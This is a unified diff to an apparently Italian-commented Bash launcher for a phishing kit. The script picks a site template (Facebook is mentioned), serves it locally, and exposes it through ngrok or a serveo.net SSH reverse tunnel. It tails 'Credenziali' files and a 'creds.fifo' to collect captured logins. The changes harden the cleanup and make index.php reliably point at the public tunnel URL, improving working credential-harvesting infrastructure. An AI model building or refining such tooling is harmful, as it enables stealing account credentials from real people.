@@ -45,14 +45,24 @@ function cleanup() {
   # Assicura di uccidere eventuali watcher residui (tail/reader)
   pkill -f "tail -n0 -F .*Credenziali_.*.txt" >/dev/null 2>&1 || true
   pkill -f "creds.fifo" >/dev/null 2>&1 || true
-  for pid in "${PIDS[@]}"; do
-    if kill -0 "$pid" 2>/dev/null; then
-      kill "$pid" || true
-    fi
-  done
+    # Termina i PIDs registrati
+    for pid in "${PIDS[@]}"; do
+      if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
+        kill "$pid" 2>/dev/null || true
+      fi
+    done
+    # Tentativo più aggressivo: termina processi noti che lo script avvia
+    pkill -f "ngrok" >/dev/null 2>&1 || true
+    pkill -f "php -S localhost:8000" >/dev/null 2>&1 || true
+    pkill -f "ssh -o StrictHostKeyChecking=no -R 80:localhost:8000 serveo.net" >/dev/null 2>&1 || true
+    pkill -f "serveo.net" >/dev/null 2>&1 || true
+    pkill -f "python3 .*server.py" >/dev/null 2>&1 || true
   sleep 1
   exit 0
 }
+
+  # Assicura che la cleanup venga eseguita anche se lo script viene interrotto
+  trap cleanup INT TERM EXIT
 
 function print_header() {
   echo "-----------------------------------------"
@@ -91,6 +101,18 @@ TEMPLATE_FILE="${templates[$sel_index]}"
 SITE_NAME="${TEMPLATE_FILE%%.*}"
 
 print_header "Scelta: $TEMPLATE_FILE (site: $SITE_NAME)"
+
+# Aggiorna immediatamente index.php per usare il fallback locale (127.0.0.1:5001)
+# Questo evita che un valore hardcoded precedente di $ngrok_url punti ad un tunnel
+# pubblico che serve un template sbagliato (es. Facebook) prima che ngrok venga avviato.
+if [ -f "$INDEX_PHP" ]; then
+  mkdir -p "$DEBUG_DIR"
+  # Salva backup se non presente
+  if [ ! -f "$DEBUG_DIR/index.php.bak" ]; then
+    cp "$INDEX_PHP" "$DEBUG_DIR/index.php.bak" || true
+  fi
+  awk -v url="http://127.0.0.1:5001" '{ if ($0 ~ /^\s*\$ngrok_url\s*=.*/) { print "\$ngrok_url = \047" url "\047;" } else { print $0 } }' "$INDEX_PHP" > "$DEBUG_DIR/index.php.tmp" && mv "$DEBUG_DIR/index.php.tmp" "$INDEX_PHP" || true
+fi
 
 # Crea cartella credenziali
 mkdir -p "$CRED_DIR"
@@ -194,6 +216,17 @@ if ! command -v python3 >/dev/null 2>&1; then
 fi
 
 # Controlla se Flask è installato; se no, prova a installarlo (interattivo)
+# If there's a local virtualenv .venv, activate it so the script uses the project
+# environment (avoids the "flask not installed" message when Flask is in .venv).
+if [ -f "$ROOT_DIR/.venv/bin/activate" ]; then
+  echo "Attivo virtualenv locale .venv"
+  # shellcheck disable=SC1091
+  # shell will source the activate script from the project venv
+  # Use a subshell-safe source
+  # Note: this changes the shell environment of this script only.
+  source "$ROOT_DIR/.venv/bin/activate" || true
+fi
+
 if ! python3 -c "import flask" >/dev/null 2>&1; then
   cat <<'MSG'
 Il modulo Python 'flask' non è installato nel tuo ambiente Python attuale.
@@ -258,17 +291,44 @@ if [ -z "$NGROK_URL" ]; then
   fi
 fi
 
+# Esporta NGROK_URL per far sì che index.php lo usi via getenv() invece di dover riscrivere il file
+export NGROK_URL
+
 if [ -z "$NGROK_URL" ]; then
   echo "Non sono riuscito a leggere l'URL di ngrok automaticamente; controlla $ROOT_DIR/ngrok.log"
 else
-  # Sostituisci qualunque valore esistente nella variabile $ngrok_url dentro index.php
-  # Cerca il placeholder __NGROK_URL__ e sostituiscilo; altrimenti sovrascrivi la riga di assegnazione
+  # Forza la sostituzione della riga che assegna $ngrok_url in index.php
   if [ -f "$INDEX_PHP" ]; then
-    if grep -q "__NGROK_URL__" "$INDEX_PHP" 2>/dev/null; then
-      sed "s|__NGROK_URL__|$NGROK_URL|g" "$INDEX_PHP" > "$DEBUG_DIR/index.php.tmp" && mv "$DEBUG_DIR/index.php.tmp" "$INDEX_PHP" || true
-    else
-      awk -v url="$NGROK_URL" '{ if ($0 ~ /^\s*\$ngrok_url\s*=.*/) { print "\$ngrok_url = \047" url "\047;" } else { print $0 } }' "$INDEX_PHP" > "$DEBUG_DIR/index.php.tmp" && mv "$DEBUG_DIR/index.php.tmp" "$INDEX_PHP" || true
+    # Crea backup se non presente
+    if [ ! -f "$DEBUG_DIR/index.php.bak" ]; then
+      cp "$INDEX_PHP" "$DEBUG_DIR/index.php.bak" || true
     fi
+    # Usa sed per sostituire la riga di assegnazione $ngrok_url = '...';
+    # Usa un separatore @ per evitare problemi con URL contenenti / e imposta LC_ALL per stabilità
+    LC_ALL=C sed -E "s@\$ngrok_url\s*=\s*'[^']*'\s*;@\$ngrok_url = '$NGROK_URL';@" "$INDEX_PHP" > "$DEBUG_DIR/index.php.tmp" || true
+    if [ -s "$DEBUG_DIR/index.php.tmp" ]; then
+      mv "$DEBUG_DIR/index.php.tmp" "$INDEX_PHP" || true
+      echo "[INFO] Wrote NGROK_URL=$NGROK_URL into $INDEX_PHP" >> "$DEBUG_DIR/ngrok_replace.log" || true
+      echo "[INFO] Wrote NGROK_URL=$NGROK_URL into $INDEX_PHP"
+    else
+      echo "[WARN] sed replace produced empty tmp; not overwriting $INDEX_PHP" >> "$DEBUG_DIR/ngrok_replace.log" || true
+      echo "[WARN] sed replace produced empty tmp; not overwriting $INDEX_PHP"
+    fi
+  fi
+fi
+
+if [ -z "$NGROK_URL" ] && [ -f "$INDEX_PHP" ]; then
+  # Se non abbiamo NGROK_URL, assicuriamoci che index.php contenga il fallback locale
+  # Se non abbiamo NGROK_URL, imposta il fallback tramite sed
+  NGROK_URL='http://127.0.0.1:5001'
+  LC_ALL=C sed -E "s@\$ngrok_url\s*=\s*'[^']*'\s*;@\$ngrok_url = '$NGROK_URL';@" "$INDEX_PHP" > "$DEBUG_DIR/index.php.tmp" || true
+  if [ -s "$DEBUG_DIR/index.php.tmp" ]; then
+    mv "$DEBUG_DIR/index.php.tmp" "$INDEX_PHP" || true
+    echo "[INFO] No NGROK_URL detected: set fallback http://127.0.0.1:5001 in $INDEX_PHP" >> "$DEBUG_DIR/ngrok_replace.log" || true
+    echo "[INFO] Set fallback http://127.0.0.1:5001 in $INDEX_PHP"
+  else
+    echo "[WARN] sed fallback produced empty tmp; not overwriting $INDEX_PHP" >> "$DEBUG_DIR/ngrok_replace.log" || true
+    echo "[WARN] sed fallback produced empty tmp; not overwriting $INDEX_PHP"
   fi
 fi
 
